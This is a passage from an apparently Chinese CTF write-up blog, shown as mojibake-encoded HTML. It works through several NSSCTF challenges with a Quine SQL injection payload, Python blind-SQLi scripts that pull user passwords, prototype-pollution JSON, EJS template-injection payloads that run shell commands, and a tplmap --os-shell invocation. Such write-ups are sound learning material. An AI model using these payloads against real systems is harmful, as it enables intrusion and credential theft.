æ³¨å…¥ä¸­</p>\n<p>é¦–å…ˆæ—¶é—´ç›²æ³¨å‘ç°è¿™æ˜¯ä¸€ä¸ªç©ºè¡¨</p>\n<p>æ—¶é—´ç›²æ³¨å¯ä»¥çœ‹çœ‹è¿™ç¯‡:<a href=\"https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/\"> æ¥å‘€</a></p>\n<h4 id=\"quineæ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#quineæ³¨å…¥\">#</a> Quine æ³¨å…¥</h4>\n<h5 id=\"replaceå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#replaceå‡½æ•°\">#</a> replace () å‡½æ•°</h5>\n<p>replace(object,search,replace)<br>\n æŠŠ object å¯¹è±¡ä¸­å‡ºç°çš„ search å…¨éƒ¨æ›¿æ¢æˆ replac, ç„¶åè¿”å›æ›¿æ¢åçš„ç»“æœ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(&quot;.&quot;,char(46),&quot;.&quot;);</span><br><span class=\"line\">è¿™é‡Œçš„char(46)ç­‰äº.</span><br><span class=\"line\">å°†&quot;.&quot;é‡Œçš„.æ¢æˆ.å¹¶è¿”å›æ›¿æ¢çš„ç»“æœ.</span><br><span class=\"line\"></span><br><span class=\"line\">select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;);</span><br><span class=\"line\">ç»“æœä¸º:</span><br><span class=\"line\">replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;)</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">replace(â€˜replace(&quot;.&quot;,char(46),&quot;.&quot;)â€™,char(46),â€˜replace(&quot;.&quot;,char(46),&quot;.&quot;)â€™)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">replace(â€œreplace(â€.&quot;,char(46),&quot;.&quot;)&quot;,char(46),â€œreplace(â€.&quot;,char(46),&quot;.&quot;)&quot;)</td>\n</tr>\n</tbody>\n</table>\n<p>åŸå› ï¼šç¬¬ä¸‰ä¸ªå‚æ•°æŠŠç¬¬ä¸€ä¸ªå‚æ•°çš„ã€‚æ¢æˆ replace (&quot;.&quot;,char (46),&quot;.&quot;)<br>\n ä½†æ˜¯æ­¤æ—¶å˜æˆäº†åŒå¼•å·ï¼Œæˆ‘ä»¬æ¢æˆå•å¼•å·æ‰èƒ½ä¿è¯è¾“å…¥è¾“å‡ºä¸€æ ·ï¼Œchar (34) ä¸º &quot; char (46) ä¸ºâ€™</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(replace(&#x27;&quot;.&quot;&#x27;,char(34),char(39)),char(46),&quot;.&quot;);</span><br><span class=\"line\">å°†&quot;.&quot;çš„&quot;æ¢æˆ&#x27;,ç„¶åå°†.æ¢æˆ.</span><br><span class=\"line\">ç»“æœæ˜¯:&#x27;.&#x27;</span><br><span class=\"line\">é‚£ä¹ˆå°±å¯ä»¥è¿™æ ·æ„é€ :</span><br></pre></td></tr></table></figure>\n<p>æœ€ç»ˆ:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br></pre></td></tr></table></figure>\n<p>è¿‡ç¨‹ï¼šçœ‹æœ€å¤–é¢çš„ replace å‡½æ•°<br>\n replace (â€˜replace (replace (&quot;.&quot;,char (34),char (39)),char (46),&quot;.&quot;)â€™,char (34),char (39)) é‡Œé¢çš„ char (46) ä¹Ÿå°±æ˜¯ã€‚æ¢æˆ replace (replace (&quot;.&quot;,char (34),char (39)),char (46),&quot;.&quot;) å°±æ˜¯:</p>\n<p>replace(â€˜replace(replace(â€œreplace(replace(â€.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&quot;,char(34),char(39)),char(46),â€œreplace(replace(â€.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&quot;)â€™,char(34),char(39))</p>\n<p>ç„¶åå°±æ˜¯æŠŠ replace (replace (â€œreplace (replace (â€.&quot;,char (34),char (39)),char (46),&quot;.&quot;)&quot;,char (34),char (39)),char (46),â€œreplace (replace (â€.&quot;,char (34),char (39)),char (46),&quot;.&quot;)&quot;) é‡Œé¢çš„ char (34) ä¹Ÿå°±æ˜¯åŒå¼•å·æ¢æˆ char (39) å•å¼•å·ï¼Œå°±æ˜¯:</p>\n<p>replace(replace(â€˜replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)â€™,char(34),char(39)),char(46),â€˜replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)â€™)<br>\n å°±å˜å›äº†åŸæ ·</p>\n<h5 id=\"quineåŸºæœ¬å½¢å¼\"><a class=\"markdownIt-Anchor\" href=\"#quineåŸºæœ¬å½¢å¼\">#</a> Quine åŸºæœ¬å½¢å¼</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;/**/union/**/select/**/replace(replace(&#x27;str&#x27;,char(34),char(39)),char(46),&#x27;str&#x27;)#</span><br></pre></td></tr></table></figure>\n<p>é‚£ä¹ˆ str åŸºæœ¬å½¢å¼:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;union/**/select/**/replace(replace(&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>\n<h3 id=\"26hznuctf-2023-preliminaryezlogin\"><a class=\"markdownIt-Anchor\" href=\"#26hznuctf-2023-preliminaryezlogin\">#</a> 26.[HZNUCTF 2023 preliminary]ezlogin</h3>\n<p>æŸ¥çœ‹æºä»£ç å‘ç°è¿™ä¸ªæ³¨é‡Š:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">$username = strrev(base64_decode($_POST[&#x27;username&#x27;]));</span></span><br><span class=\"line\"><span class=\"comment\">$username = preg_replace(&#x27;/select|union|and|database/&#x27;, &quot;hznuctf2023&quot;, $username);--&gt;</span></span><br></pre></td></tr></table></figure>\n<p>å†™æ®µ php æ¥æµ‹è¯•é¡µé¢</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"string\">&quot;1&#x27;||if(1,sleep(5),1)#&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">strrev</span>(<span class=\"variable\">$b</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">strrev</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$c</span>;</span><br><span class=\"line\"><span class=\"comment\">/*1||if(1,sleep(5),1)#</span></span><br><span class=\"line\"><span class=\"comment\">åˆ¤æ–­å‡ºå•å¼•å·é—­åˆ</span></span><br><span class=\"line\"><span class=\"comment\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>è¿‡æ»¤äº† +, ç©ºæ ¼ï¼Œ=,<br>\n æ³¨é‡Šç”¨ #,= ç”¨ like, ç©ºæ ¼ç”¨ <code>/**/</code>  æ—¶é—´ç›²æ³¨è„šæœ¬æ”¹ä¸‹å‚æ•°å³å¯</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> base64  </span><br><span class=\"line\"><span class=\"keyword\">import</span> datetime  </span><br><span class=\"line\">  </span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://node1.anna.nssctf.cn:28802/&#x27;</span>  </span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100</span>):  <span class=\"comment\">#è¿™é‡Œå…¶å®æ˜¯33åˆ°100,æ³¨æ„iæ˜¯æˆªå–çš„èŒƒå›´</span></span><br><span class=\"line\">low = <span class=\"number\">32</span>  </span><br><span class=\"line\">high = <span class=\"number\">130</span>  </span><br><span class=\"line\">mid = (high + low) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">while</span> (low &lt; high):  </span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;1&#x27;||if((ascii(substr((DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/DATABASE()/**/AND/**/table_name/**/like/**/&#x27;user&#x27;),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class=\"line\">payload = <span class=\"string\">&quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(&#x27;username&#x27;,&#x27;^&#x27;,password)/**/from/**/users.user),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\">payload = payload.<span class=\"built_in\">format</span>(i, mid)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(payload)  </span><br><span class=\"line\">payload = base64.b64encode(payload[::-<span class=\"number\">1</span>].encode(<span class=\"string\">&quot;utf-8&quot;</span>))  </span><br><span class=\"line\">data = &#123;  </span><br><span class=\"line\"><span class=\"string\">&#x27;username&#x27;</span>:payload,  </span><br><span class=\"line\"><span class=\"string\">&#x27;passwd&#x27;</span>:<span class=\"string\">&#x27;1&#x27;</span>  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">time1 = datetime.datetime.now()  </span><br><span class=\"line\">r = requests.post(url, data)  </span><br><span class=\"line\">time2 = datetime.datetime.now()  </span><br><span class=\"line\">time = (time2 - time1).seconds  </span><br><span class=\"line\"><span class=\"keyword\">if</span> time &gt; <span class=\"number\">1</span>:  </span><br><span class=\"line\">low = mid + <span class=\"number\">1</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\">high = mid  </span><br><span class=\"line\">mid = (low + high) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">if</span> (mid == <span class=\"number\">32</span> <span class=\"keyword\">or</span> mid == <span class=\"number\">130</span>):  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\">flag += <span class=\"built_in\">chr</span>(mid)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>å‡å¦‚æˆ‘ä»¬çŸ¥é“æˆåŠŸæ—¶ä¼šè¿”å› success, é‚£ä¹ˆæ­¤é¢˜è¿˜å¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨ (æ—¶é—´æ›´å¿«ï¼Œä¼˜å…ˆè€ƒè™‘)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64  </span><br><span class=\"line\"><span class=\"comment\">#è¯·æ±‚ç½‘ç»œç•Œé¢å°±è¦è°ƒç”¨  </span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sql</span>(<span class=\"params\">url</span>):  </span><br><span class=\"line\">flag=<span class=\"string\">&#x27;&#x27;</span>  </span><br><span class=\"line\"><span class=\"comment\">#pay=&quot;1&#x27;/**/or/**/ascii(substr((SELECT/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;#&quot;  </span></span><br><span class=\"line\">pay=<span class=\"string\">&quot;1&#x27;/**/or/**/ascii(substr((SELECT/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span><span class=\"comment\">#æ ¹æ®å®é™…æƒ…å†µæ›´æ”¹  </span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">33</span>,<span class=\"number\">100</span>):<span class=\"comment\">#è¿™é‡Œçš„iå°±æ˜¯å¯æ˜¾ç¤ºå­—ç¬¦çš„èŒƒå›´  </span></span><br><span class=\"line\">left = <span class=\"number\">32</span>  </span><br><span class=\"line\">right = <span class=\"number\">126</span>  </span><br><span class=\"line\">mid = (left + right) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">while</span> (left&lt;right):  </span><br><span class=\"line\">payload = pay.<span class=\"built_in\">format</span>(i, mid) <span class=\"comment\"># è¿™ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ”¾åˆ°ä¸­æ‹¬å·  </span></span><br><span class=\"line\">data = &#123;  </span><br><span class=\"line\"><span class=\"string\">&#x27;username&#x27;</span>: base64.b64encode(payload[::-<span class=\"number\">1</span>].encode()),  </span><br><span class=\"line\"><span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;1&#x27;</span>  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">r = requests.post(url, data=data)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;success&#x27;</span> <span class=\"keyword\">in</span> r.text:<span class=\"comment\">#è¿™é‡Œçš„successå°±æ˜¯æ­£ç¡®è¿”å›çš„å†…å®¹  </span></span><br><span class=\"line\">left=mid+<span class=\"number\">1</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\">right=mid  </span><br><span class=\"line\">mid=(left+right)//<span class=\"number\">2</span>  </span><br><span class=\"line\">flag+=<span class=\"built_in\">chr</span>(mid)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&#x27;__main__&#x27;</span>:  </span><br><span class=\"line\">sql(<span class=\"string\">&#x27;http://node1.anna.nssctf.cn:28802/&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"27hgame-2023-week1guess-who-i-am\"><a class=\"markdownIt-Anchor\" href=\"#27hgame-2023-week1guess-who-i-am\">#</a> 27.[HGAME 2023 week1]Guess Who I Am</h3>\n<p>æ­¤é¢˜æºä»£ç æœ‰æç¤ºä¸€ä¸ª:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1BvdGF0MDAwMC9WaWRhci1XZWJzaXRlL2Jsb2IvbWFzdGVyL3NyYy9zY3JpcHRzL2NvbmZpZy9tZW1iZXIuanM=\"> ç½‘å€</span><br>\nä¸éš¾çœ‹å‡ºæ­¤é¢˜è¦æ±‚æ ¹æ®å†…å®¹æ‰¾åˆ°æˆå‘˜åå­—æäº¤æ­£ç¡® 100 æ¬¡å³å¯ï¼Œä½†æ˜¯é‚£äº›ç‰¹å¾å´ä¸åœ¨æºä»£ç ä¸­ã€‚å› ä¸ºé‚£æ˜¯ js åŠ¨æ€ç”Ÿæˆçš„<br>\næ€è·¯ï¼šçˆ¬å–æ ‡ç­¾å†…å®¹ -&gt; æ‰¾åˆ° json æ•°æ®ä¸­å¯¹åº”çš„æˆå‘˜ -&gt; æäº¤ç»™ç½‘é¡µ<br>\n<a href=\"\">çˆ¬å– js åŠ¨æ€æ•°æ®å¯ä»¥çœ‹è¿™ç¯‡</a><br>\n exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> json  </span><br><span class=\"line\">  </span><br><span class=\"line\">host = <span class=\"string\">&quot;http://node2.anna.nssctf.cn:28018/&quot;</span>  </span><br><span class=\"line\">getQ = host + <span class=\"string\">&quot;api/getQuestion&quot;</span>  </span><br><span class=\"line\">getS = host + <span class=\"string\">&quot;api/getScore&quot;</span>  </span><br><span class=\"line\">postA = host + <span class=\"string\">&quot;api/verifyAnswer&quot;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># æ‰“å¼€æ–‡æœ¬,è¿™é‡Œæ˜¯ä»HINTç»™çš„é‚£ä¸ªç½‘ç«™ä¸Šå¤åˆ¶ä¸‹æ¥çš„ï¼Œç„¶ååšäº†æ‰‹å·¥å¤„ç†æ–¹ä¾¿åç»­ä»£ç æ‰§è¡Œï¼Œ  </span></span><br><span class=\"line\"><span class=\"comment\">#ä¸€æ˜¯æŠŠæœ€å¤–å±‚çš„æ–¹æ‹¬å·å’Œé‚£ä¸²å­—ç¬¦å»æ‰äº†ï¼ŒäºŒæ˜¯æŠŠæœ€åä¸€ä¸ªèŠ±æ‹¬å·å»æ‰äº†ï¼Œä¸‰æ˜¯æŠŠavatarçš„å€¼æœ‰requireçš„æŠŠä»–å¤„ç†æˆåŒå¼•å·åŒ…å«çš„å­—ç¬¦ï¼Œå› ä¸ºå­—å…¸æ²¡æœ‰é•¿è¿™æ ·çš„  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">r&quot;C:\\Users\\30779\\Desktop\\1.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:  </span><br><span class=\"line\">data = f.read() <span class=\"comment\"># è¯»å–æ–‡æœ¬  </span></span><br><span class=\"line\">members = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, data.split(<span class=\"string\">&#x27;&#125;,&#x27;</span>)))  </span><br><span class=\"line\">  </span><br><span class=\"line\">session = requests.session() <span class=\"comment\"># ä¿æŒä¼šè¯ï¼Œé¿å…æ¯æ¬¡è¯·æ±‚Cookieä¸åŒ  </span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">101</span>):  </span><br><span class=\"line\">Q = json.loads(session.get(getQ).text)[<span class=\"string\">&#x27;message&#x27;</span>] <span class=\"comment\"># å°†è·å–åˆ°çš„jsonæ•°æ®è½¬æ¢æˆå­—å…¸  </span></span><br><span class=\"line\">S = json.loads(session.get(getS).text)[<span class=\"string\">&#x27;message&#x27;</span>]  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;æ‚¨è¦å›ç­”çš„é—®é¢˜ &#x27;</span>+Q)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;æ‚¨ç°åœ¨çš„åˆ†æ•°ä¸º &#x27;</span>+<span class=\"built_in\">str</span>(S))  </span><br><span class=\"line\"><span class=\"keyword\">for</span> member <span class=\"keyword\">in</span> members:  </span><br><span class=\"line\">member += <span class=\"string\">&#x27;&#125;&#x27;</span>  </span><br><span class=\"line\">dic = json.loads(member)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> dic[<span class=\"string\">&#x27;intro&#x27;</span>] == Q:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;æ­å–œä½ æ‰¾åˆ°äº† &#x27;</span>+dic[<span class=\"string\">&#x27;id&#x27;</span>])  </span><br><span class=\"line\">session.post(postA, data=&#123;<span class=\"string\">&#x27;id&#x27;</span>: dic[<span class=\"string\">&#x27;id&#x27;</span>]&#125;)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-----------------------------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"28hgame-2023-week4shared-diary\"><a class=\"markdownIt-Anchor\" href=\"#28hgame-2023-week4shared-diary\">#</a> 28.[HGAME 2023 week4]Shared Diary</h3>\n<p>è€ƒç‚¹ï¼šåŸå‹é“¾æ±¡æŸ“å’Œ ejs æ¨¡æ¿ ssti<br>\n<a href=\"\"> åŸå‹é“¾æ±¡æŸ“å¯ä»¥çœ‹è¿™ç¯‡</a><br>\n burp æŠ“åŒ…ï¼Œæ”¹ Content-Type ä¸º application/json ç”¨æ¥å‘ json æ•°æ®<br>\né™„ä»¶çš„æºä»£ç æœ‰ merge å‡½æ•°å¯¼è‡´åŸå‹é“¾ï¼Œè¿‡æ»¤äº† <code>__proto__</code> è¦ç”¨ constructor.prototype æ¥ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;constructor&quot;:Â &#123;&quot;prototype&quot;:Â &#123;&quot;role&quot;:Â &quot;admin&quot;&#125;&#125;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p>æˆ–è€…:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;password&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™æ®µ payload å…ˆå®šä¹‰ constructor çš„æ„é€ æ–¹æ³•ï¼Œåˆ©ç”¨åŸå‹å¯¹è±¡ prototype å®šä¹‰ä¸€ä¸ªå±æ€§ role å€¼ä¸º admin,<br>\n ç„¶å response ä¼šæ˜¾ç¤ºä¸€ä¸ª<mark> Set-Cookie</mark> çš„ session å€¼ï¼Œå‘Šè¯‰ä½ è¿™æ˜¯ 302 é‡å®šå‘ç”¨çš„ï¼Œè·¯å¾„æ˜¯ /<br>\n å› æ­¤æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ª session ç™»å½• (username å’Œ password éƒ½æ˜¯ admin), æ³¨æ„<mark>æ­¤æ—¶è¦ä¿®æ”¹è·¯å¾„ä¸º /, å¦åˆ™ç™»ä¸è¿›å»</mark></p>\n<p>è¿›å…¥åæ˜¯ä¸€ä¸ª ejs æ¨¡æ¿æ³¨å…¥<br>\n <code>&#123;%-code%&#125;</code>  æ ‡ç­¾å¯ä»¥æ‰§è¡Œ js ä»£ç ï¼Œæ­¤é¢˜æ— è¿‡æ»¤<br>\næ­¥éª¤è·Ÿä¹‹å‰ä¸€æ ·ï¼Œæ”¹ session,<mark> æ¢è·¯å¾„ä¸º /</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;) %&gt;</span><br></pre></td></tr></table></figure>\n<p>payload2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%- process.mainModule.require(&#x27;fs&#x27;).readFileSync(&#x27;/flag&#x27;).toString() %&gt;</span><br></pre></td></tr></table></figure>\n<p>tplmap</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python tplmap.py -u http://node2.anna.nssctf.cn:28131/ -d diary=1 -c session=s%3AevnNci_FQ3mbuQ53FJAkHIG1q_3Cmzf7.7MN5h%2F6huxvKTZFAUDFvPi%2FS0s8i53HTpqqutPLTp1U -e ejs --os-shell</span><br></pre></td></tr></table></figure>\n<h3 id=\"29hznuctf-2023-finaleznode\"><a class=\"markdownIt-Anchor\" href=\"#29hznuctf-2023-finaleznode\">#</a> 29.[HZNUCTF 2023 final]eznode</h3>\n<p>æ­¤é¢˜è¦å­¦ä¹  VM2 å’Œ VM2 